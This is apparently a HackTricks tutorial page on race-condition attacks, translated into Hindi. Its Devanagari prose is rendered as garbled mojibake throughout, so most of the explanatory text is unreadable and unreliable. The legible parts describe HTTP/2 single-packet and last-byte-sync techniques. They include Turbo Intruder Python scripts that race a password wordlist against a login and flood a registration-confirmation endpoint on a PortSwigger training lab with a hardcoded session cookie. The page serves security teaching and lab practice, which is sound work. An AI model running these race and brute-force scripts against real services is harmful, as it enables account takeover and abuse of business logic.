# ‡§∞‡•á‡§∏ ‡§ï‡§Ç‡§°‡•Ä‡§∂‡§®

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞ ‡§Ü‡§∏‡§æ‡§®‡•Ä ‡§∏‡•á **‡§ë‡§ü‡•ã‡§Æ‡•á‡§ü ‡§µ‡§∞‡•ç‡§ï‡§´‡§º‡•ç‡§≤‡•ã** ‡§¨‡§®‡§æ‡§è‡§Ç ‡§ú‡•ã ‡§¶‡•Å‡§®‡§ø‡§Ø‡§æ ‡§ï‡•á **‡§∏‡§¨‡§∏‡•á ‡§â‡§®‡•ç‡§®‡§§** ‡§∏‡§Æ‡•Å‡§¶‡§æ‡§Ø ‡§â‡§™‡§ï‡§∞‡§£‡•ã‡§Ç ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§∏‡§Ç‡§ö‡§æ‡§≤‡§ø‡§§ ‡§π‡•à‡§Ç‡•§\
‡§Ü‡§ú ‡§π‡•Ä ‡§™‡§π‡•Å‡§Ç‡§ö‡•á‡§Ç:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>‡§ú‡§æ‡§®‡•á‡§Ç AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ï‡•ã ‡§∂‡•Ç‡§®‡•ç‡§Ø ‡§∏‡•á ‡§π‡•Ä‡§∞‡•ã ‡§§‡§ï</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§Ö‡§®‡•ç‡§Ø ‡§§‡§∞‡•Ä‡§ï‡•á:

* ‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§Ö‡§™‡§®‡•Ä ‡§ï‡§Ç‡§™‡§®‡•Ä ‡§ï‡§æ ‡§µ‡§ø‡§ú‡•ç‡§û‡§æ‡§™‡§® HackTricks ‡§Æ‡•á‡§Ç ‡§¶‡•á‡§ñ‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç ‡§Ø‡§æ **HackTricks ‡§ï‡•ã PDF ‡§Æ‡•á‡§Ç ‡§°‡§æ‡§â‡§®‡§≤‡•ã‡§°** ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç ‡§§‡•ã [**‡§∏‡§¨‡•ç‡§∏‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§∂‡§® ‡§™‡•ç‡§≤‡§æ‡§®**](https://github.com/sponsors/carlospolop) ‡§¶‡•á‡§ñ‡•á‡§Ç!
* [**‡§Ü‡§ß‡§ø‡§ï‡§æ‡§∞‡§ø‡§ï PEASS ‡§î‡§∞ HackTricks ‡§∏‡•ç‡§µ‡•à‡§ó**](https://peass.creator-spring.com) ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç
* ‡§π‡§Æ‡§æ‡§∞‡•á ‡§µ‡§ø‡§∂‡•á‡§∑ [**NFTs**](https://opensea.io/collection/the-peass-family) ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π **The PEASS Family** ‡§ï‡•Ä ‡§ñ‡•ã‡§ú ‡§ï‡§∞‡•á‡§Ç
* **‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç** üí¨ [**‡§°‡§ø‡§∏‡•ç‡§ï‡•â‡§∞‡•ç‡§° ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**‡§ü‡•á‡§≤‡•Ä‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Ø‡§æ ‡§π‡§Æ‡•á‡§Ç **‡§ü‡•ç‡§µ‡§ø‡§ü‡§∞** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** ‡§™‡§∞ ‡§´‡•â‡§≤‡•ã** ‡§ï‡§∞‡•á‡§Ç‡•§
* **‡§Ö‡§™‡§®‡•á ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç** ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ PRs ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡§ï‡•á [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos ‡§Æ‡•á‡§Ç‡•§

</details>

{% hint style="warning" %}
‡§á‡§∏ ‡§§‡§ï‡§®‡•Ä‡§ï ‡§ï‡•ã ‡§ó‡§π‡§∞‡•Ä ‡§∏‡§Æ‡§ù‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Æ‡•Ç‡§≤ ‡§∞‡§ø‡§™‡•ã‡§∞‡•ç‡§ü ‡§ï‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡§∞‡•á‡§Ç [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
{% endhint %}

## ‡§∞‡•á‡§∏ ‡§ï‡§Ç‡§°‡•Ä‡§∂‡§® ‡§π‡§Æ‡§≤‡•á ‡§ï‡•ã ‡§¨‡§¢‡§º‡§æ‡§µ‡§æ ‡§¶‡•á‡§®‡§æ

‡§∞‡•á‡§∏ ‡§ï‡§Ç‡§°‡•Ä‡§∂‡§® ‡§ï‡§æ ‡§≤‡§æ‡§≠ ‡§â‡§†‡§æ‡§®‡•á ‡§ï‡•Ä ‡§Æ‡•Å‡§ñ‡•ç‡§Ø ‡§¨‡§æ‡§ß‡§æ ‡§Ø‡§π ‡§π‡•à ‡§ï‡§ø ‡§∏‡•Å‡§®‡§ø‡§∂‡•ç‡§ö‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è ‡§ï‡§ø ‡§ï‡§à ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§∏‡§Æ‡§Ø ‡§™‡§∞ ‡§∏‡§Ç‡§≠‡§æ‡§≤‡•á ‡§ú‡§æ‡§§‡•á ‡§π‡•à‡§Ç, ‡§â‡§®‡§ï‡•á ‡§™‡•ç‡§∞‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£ ‡§∏‡§Æ‡§Ø ‡§Æ‡•á‡§Ç **‡§¨‡§π‡•Å‡§§ ‡§ï‡§Æ ‡§Ö‡§Ç‡§§‡§∞ ‡§π‡•ã‚Äî‡§Ü‡§¶‡§∞‡•ç‡§∂ ‡§∞‡•Ç‡§™ ‡§∏‡•á, 1ms ‡§∏‡•á ‡§ï‡§Æ**‡•§

‡§Ø‡§π‡§æ‡§Å ‡§Ü‡§™‡§ï‡•ã ‡§∏‡§Æ‡§ï‡§æ‡§≤‡§ø‡§ï ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß‡•ã‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡•Å‡§õ ‡§§‡§ï‡§®‡•Ä‡§ï ‡§Æ‡§ø‡§≤‡•á‡§ó‡•Ä:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

* **HTTP/2**: ‡§è‡§ï ‡§π‡•Ä TCP ‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§® ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§¶‡•ã ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§≠‡•á‡§ú‡§®‡•á ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§®‡•á‡§ü‡§µ‡§∞‡•ç‡§ï ‡§ú‡§ø‡§ü‡§∞ ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ ‡§ï‡•ã ‡§ï‡§Æ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§ ‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø, ‡§∏‡§∞‡•ç‡§µ‡§∞-‡§∏‡§æ‡§á‡§° ‡§µ‡§ø‡§µ‡§ø‡§ß‡§§‡§æ‡§ì‡§Ç ‡§ï‡•á ‡§ï‡§æ‡§∞‡§£, ‡§¶‡•ã ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§è‡§ï ‡§∏‡•ç‡§•‡§ø‡§∞ ‡§∞‡•á‡§∏ ‡§ï‡§Ç‡§°‡•Ä‡§∂‡§® ‡§π‡§Æ‡§≤‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡§∞‡•ç‡§Ø‡§æ‡§™‡•ç‡§§ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã ‡§∏‡§ï‡§§‡•á‡•§
* **HTTP/1.1 'Last-Byte Sync'**: 20-30 ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß‡•ã‡§Ç ‡§ï‡•á ‡§Ö‡§ß‡§ø‡§ï‡§æ‡§Ç‡§∂ ‡§π‡§ø‡§∏‡•ç‡§∏‡•á ‡§ï‡•ã ‡§™‡•Ç‡§∞‡•ç‡§µ-‡§≠‡•á‡§ú‡§® ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à, ‡§è‡§ï ‡§õ‡•ã‡§ü‡§æ ‡§ü‡•Å‡§ï‡§°‡§º‡§æ ‡§∞‡•ã‡§ï‡§§‡§æ ‡§π‡•à, ‡§ú‡§ø‡§∏‡•á ‡§´‡§ø‡§∞ ‡§∏‡§æ‡§• ‡§Æ‡•á‡§Ç ‡§≠‡•á‡§ú‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§™‡§∞ ‡§∏‡§Æ‡§ï‡§æ‡§≤‡§ø‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö ‡§ï‡•ã ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§

**Last-Byte Sync ‡§ï‡•á ‡§≤‡§ø‡§è ‡§§‡•à‡§Ø‡§æ‡§∞‡•Ä** ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•à:

1. ‡§∏‡•ç‡§ü‡•ç‡§∞‡•Ä‡§Æ ‡§∏‡§Æ‡§æ‡§™‡•ç‡§§ ‡§ï‡§ø‡§è ‡§¨‡§ø‡§®‡§æ ‡§π‡•á‡§°‡§∞ ‡§î‡§∞ ‡§¨‡•â‡§°‡•Ä ‡§°‡•á‡§ü‡§æ ‡§≠‡•á‡§ú‡§®‡§æ‡•§
2. ‡§™‡•ç‡§∞‡§æ‡§∞‡§Ç‡§≠‡§ø‡§ï ‡§≠‡•á‡§ú‡§® ‡§ï‡•á ‡§¨‡§æ‡§¶ 100ms ‡§ï‡•á ‡§≤‡§ø‡§è ‡§†‡§π‡§∞‡§æ‡§µ‡•§
3. ‡§Ö‡§Ç‡§§‡§ø‡§Æ ‡§´‡•ç‡§∞‡•á‡§Æ ‡§ï‡•á ‡§¨‡•à‡§ö‡§ø‡§Ç‡§ó ‡§ï‡•á ‡§≤‡§ø‡§è Nagle's ‡§è‡§≤‡•ç‡§ó‡•ã‡§∞‡§ø‡§•‡•ç‡§Æ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è TCP\_NODELAY ‡§ï‡•ã ‡§Ö‡§ï‡•ç‡§∑‡§Æ ‡§ï‡§∞‡§®‡§æ‡•§
4. ‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§® ‡§ï‡•ã ‡§ó‡§∞‡•ç‡§Æ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡§ø‡§Ç‡§ó ‡§ï‡§∞‡§®‡§æ‡•§

‡§¨‡§æ‡§ß‡§ø‡§§ ‡§´‡•ç‡§∞‡•á‡§Æ‡•ç‡§∏ ‡§ï‡•á ‡§â‡§∏‡§ï‡•á ‡§≠‡•á‡§ú‡§®‡•á ‡§ï‡•á ‡§¨‡§æ‡§¶ ‡§â‡§®‡§ï‡•Ä ‡§è‡§ï‡§≤ ‡§™‡•à‡§ï‡•á‡§ü ‡§Æ‡•á‡§Ç ‡§™‡§π‡•Å‡§Ç‡§ö‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è, ‡§ú‡§ø‡§∏‡•á Wireshark ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§∏‡§§‡•ç‡§Ø‡§æ‡§™‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§ ‡§Ø‡§π ‡§µ‡§ø‡§ß‡§ø ‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø‡§§: ‡§Ü‡§∞‡§∏‡•Ä ‡§π‡§Æ‡§≤‡•ã‡§Ç ‡§Æ‡•á‡§Ç ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§®‡•á ‡§µ‡§æ‡§≤‡•á ‡§∏‡•ç‡§•‡§ø‡§∞ ‡§´‡§º‡§æ‡§á‡§≤‡•ã‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è ‡§≤‡§æ‡§ó‡•Ç ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§§‡•Ä ‡§π‡•à‡•§

### ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§µ‡§æ‡§∏‡•ç‡§§‡•Å‡§ï‡§≤‡§æ ‡§ï‡•ã ‡§Ö‡§®‡•Å‡§ï‡•Ç‡§≤‡§ø‡§§ ‡§ï‡§∞‡§®‡§æ

‡§≤‡§ï‡•ç‡§∑‡•ç‡§Ø ‡§ï‡•Ä ‡§µ‡§æ‡§∏‡•ç‡§§‡•Å‡§ï‡§≤‡§æ ‡§ï‡•ã ‡§∏‡§Æ‡§ù‡§®‡§æ ‡§Æ‡§π‡§§‡•ç‡§µ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§π‡•à‡•§ ‡§´‡•ç‡§∞‡§Ç‡§ü-‡§è‡§Ç‡§° ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß‡•ã‡§Ç ‡§ï‡•ã ‡§µ‡§ø‡§≠‡§ø‡§®‡•ç‡§® ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§∞‡•Ç‡§ü ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§ú‡•ã ‡§∏‡§Æ‡§Ø ‡§™‡§∞ ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ ‡§°‡§æ‡§≤ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§ ‡§Ö‡§∞‡•ç‡§•‡§π‡•Ä‡§® ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß‡•ã‡§Ç ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§™‡•Ç‡§∞‡•ç‡§µ‡§æ‡§®‡•Å‡§Æ‡§æ‡§®‡§ø‡§§ ‡§∏‡§∞‡•ç‡§µ‡§∞-‡§∏‡§æ‡§á‡§° ‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§® ‡§ó‡§∞‡•ç‡§Æ ‡§ï‡§∞‡§®‡§æ, ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§∏‡§Æ‡§Ø ‡§ï‡•ã ‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

#### ‡§∏‡§§‡•ç‡§∞-‡§Ü‡§ß‡§æ‡§∞‡§ø‡§§ ‡§≤‡•â‡§ï‡§ø‡§Ç‡§ó ‡§ï‡§æ ‡§∏‡§Ç‡§≠‡§æ‡§≤‡§®

PHP ‡§ï‡•Ä ‡§∏‡§§‡•ç‡§∞ ‡§π‡•à‡§Ç‡§°‡§≤‡§∞ ‡§ú‡•à‡§∏‡•á ‡§´‡§º‡•ç‡§∞‡•á‡§Æ‡§µ‡§∞‡•ç‡§ï ‡§∏‡§§‡•ç‡§∞ ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß‡•ã‡§Ç ‡§ï‡•ã ‡§∏‡•Ä‡§∞‡§ø‡§Ø‡§≤‡§æ‡§á‡§ú‡§º ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§ó‡•ã‡§™‡§®‡•Ä‡§Ø‡§§‡§æ ‡§µ‡§ø‡§ï‡§≤‡•ç‡§™‡•ã‡§Ç ‡§ï‡•ã ‡§õ‡§ø‡§™‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§™‡•ç‡§∞‡§§‡•ç‡§Ø‡•á‡§ï ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ï‡•á ‡§≤‡§ø‡§è ‡§µ‡§ø‡§≠‡§ø‡§®‡•ç‡§® ‡§∏‡§§‡•ç‡§∞ ‡§ü‡•ã‡§ï‡§® ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§á‡§∏ ‡§∏‡§Æ‡§∏‡•ç‡§Ø‡§æ ‡§ï‡•ã ‡§ü‡§æ‡§≤ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

#### ‡§¶‡§∞ ‡§Ø‡§æ ‡§∏‡§Ç‡§∏‡§æ‡§ß‡§® ‡§∏‡•Ä‡§Æ‡§æ‡§è‡§Ç ‡§™‡§æ‡§∞ ‡§ï‡§∞‡§®‡§æ

‡§Ø‡§¶‡§ø ‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§® ‡§ó‡§∞‡•ç‡§Æ ‡§ï‡§∞‡§®‡§æ ‡§Ö‡§∏‡§´‡§≤ ‡§π‡•à, ‡§§‡•ã ‡§µ‡•á‡§¨ ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§ï‡•Ä ‡§¶‡§∞ ‡§Ø‡§æ ‡§∏‡§Ç‡§∏‡§æ‡§ß‡§® ‡§∏‡•Ä‡§Æ‡§æ‡§è‡§Ç ‡§ú‡§æ‡§®‡§¨‡•Ç‡§ù‡§ï‡§∞ ‡§ü‡•ç‡§∞‡§ø‡§ó‡§∞ ‡§ï‡§∞‡§®‡§æ, ‡§°‡§Æ‡•Ä ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß‡•ã‡§Ç ‡§ï‡•á ‡§¨‡§æ‡§¢‡§º ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§è‡§ï‡§≤ ‡§™‡•à‡§ï‡•á‡§ü ‡§π‡§Æ‡§≤‡•á ‡§ï‡•ã ‡§∏‡•Å‡§µ‡§ø‡§ß‡§æ‡§ú‡§®‡§ï ‡§¨‡§®‡§æ‡§®‡•á ‡§Æ‡•á‡§Ç ‡§∏‡§π‡§æ‡§Ø‡§ï ‡§π‡•ã ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§∞‡•á‡§∏ ‡§ï‡§Ç‡§°‡•Ä‡§∂‡§® ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§§‡•ç‡§§‡•á‡§ú‡§ï ‡§∏‡§∞‡•ç‡§µ‡§∞-‡§∏‡§æ‡§á‡§° ‡§¶‡•á‡§∞‡•Ä ‡§ï‡•ã ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

## ‡§π‡§Æ‡§≤‡•á ‡§ï‡•á ‡§â‡§¶‡§æ‡§π‡§∞‡§£

* **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**: ‡§Ü‡§™ **Turbo intruder** ‡§Æ‡•á‡§Ç ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§≠‡•á‡§ú ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), ‡§Ü‡§™ ‡§ú‡§ø‡§∏‡•á ‡§¨‡•ç‡§∞‡•Ç‡§ü ‡§´‡§º‡•ã‡§∞‡•ç‡§∏ ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç ‡§â‡§∏‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§Æ‡•á‡§Ç **`%s`** ‡§ú‡•à‡§∏‡•á ‡§ï‡•Ä `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` ‡§ú‡•à‡§∏‡•á ‡§µ‡•à‡§≤‡•ç‡§Ø‡•Ç ‡§ï‡•ã ‡§¨‡§¶‡§≤ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ ‡§´‡§ø‡§∞ ‡§°‡•ç‡§∞‡•â‡§™ ‡§°‡§æ‡§â‡§® ‡§∏‡•á **`examples/race-single-packer-attack.py`** ‡§ï‡§æ ‡§ö‡§Ø‡§® ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

‡§Ø‡§¶‡§ø ‡§Ü‡§™ **‡§µ‡§ø‡§≠‡§ø‡§®‡•ç‡§® ‡§Æ‡§æ‡§®** ‡§≠‡•á‡§ú‡§®‡•á ‡§ú‡§æ ‡§∞‡§π‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§Ü‡§™ ‡§ï‡•ã‡§° ‡§ï‡•ã ‡§á‡§∏ ‡§µ‡§æ‡§≤‡•á ‡§∏‡•á ‡§Æ‡•â‡§°‡§ø‡§´‡§º‡§æ‡§à ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡•ã ‡§ï‡•ç‡§≤‡§ø‡§™‡§¨‡•ã‡§∞‡•ç‡§° ‡§∏‡•á ‡§è‡§ï ‡§µ‡§∞‡•ç‡§°‡§≤‡§ø‡§∏‡•ç‡§ü ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡§æ ‡§π‡•à:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
‡§Ø‡§¶‡§ø ‡§µ‡•á‡§¨ HTTP2 ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞‡§§‡§æ (‡§ï‡•á‡§µ‡§≤ HTTP1.1), ‡§§‡•ã `Engine.BURP2` ‡§ï‡•Ä ‡§¨‡§ú‡§æ‡§Ø `Engine.THREADED` ‡§Ø‡§æ `Engine.BURP` ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡•á‡§Ç‡•§
{% endhint %}

* **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: ‡§Ø‡§¶‡§ø ‡§Ü‡§™‡§ï‡•ã RCE ‡§ï‡•ã ‡§ü‡•ç‡§∞‡§ø‡§ó‡§∞ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è 1 ‡§è‡§Ç‡§°‡§™‡•â‡§á‡§Ç‡§ü ‡§ï‡•ã ‡§∞‡§ø‡§ï‡•ç‡§µ‡•á‡§∏‡•ç‡§ü ‡§≠‡•á‡§ú‡§®‡•á ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§´‡§ø‡§∞ ‡§Ö‡§®‡•ç‡§Ø ‡§è‡§Ç‡§°‡§™‡•â‡§á‡§Ç‡§ü‡•ç‡§∏ ‡§™‡§∞ ‡§è‡§ï‡§æ‡§ß‡§ø‡§ï ‡§∞‡§ø‡§ï‡•ç‡§µ‡•á‡§∏‡•ç‡§ü ‡§≠‡•á‡§ú‡§®‡•á ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§Ü‡§™ `race-single-packet-attack.py` ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡•ã ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§§‡§∞‡§π ‡§∏‡•á ‡§¨‡§¶‡§≤ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* ‡§Ø‡§π ‡§≠‡•Ä **‡§∞‡§ø‡§™‡•Ä‡§ü‡§∞** ‡§Æ‡•á‡§Ç ‡§â‡§™‡§≤‡§¨‡•ç‡§ß ‡§π‡•à ‡§¨‡§∞‡•ç‡§™ ‡§∏‡•ç‡§µ‡•Ä‡§ü ‡§ï‡•á ‡§®‡§è '**‡§∏‡§Æ‡•Ç‡§π ‡§ï‡•ã ‡§™‡•à‡§∞‡§≤‡§≤ ‡§≠‡•á‡§ú‡•á‡§Ç**' ‡§µ‡§ø‡§ï‡§≤‡•ç‡§™ ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á‡•§
* **‡§≤‡§ø‡§Æ‡§ø‡§ü-‡§ì‡§µ‡§∞‡§®** ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ü‡§™ ‡§¨‡§∏ **‡§∏‡§Æ‡•Ç‡§π ‡§Æ‡•á‡§Ç 50 ‡§¨‡§æ‡§∞ ‡§è‡§ï ‡§π‡•Ä ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ú‡•ã‡§°‡§º ‡§∏‡§ï‡§§‡•á** ‡§π‡•à‡§Ç‡•§
* **‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§® ‡§µ‡§æ‡§∞‡•ç‡§Æ‡§ø‡§Ç‡§ó** ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§Ü‡§™ **‡§µ‡•á‡§¨ ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§ï‡•á ‡§ï‡•Å‡§õ ‡§ó‡•à‡§∞ ‡§∏‡•ç‡§•‡§ø‡§∞ ‡§π‡§ø‡§∏‡•ç‡§∏‡•á ‡§ï‡•á ‡§≤‡§ø‡§è** ‡§∏‡§Æ‡•Ç‡§π ‡§ï‡•Ä **‡§∂‡•Å‡§∞‡•Å‡§Ü‡§§** ‡§Æ‡•á‡§Ç ‡§ï‡•Å‡§õ **‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß** ‡§ú‡•ã‡§°‡§º ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§
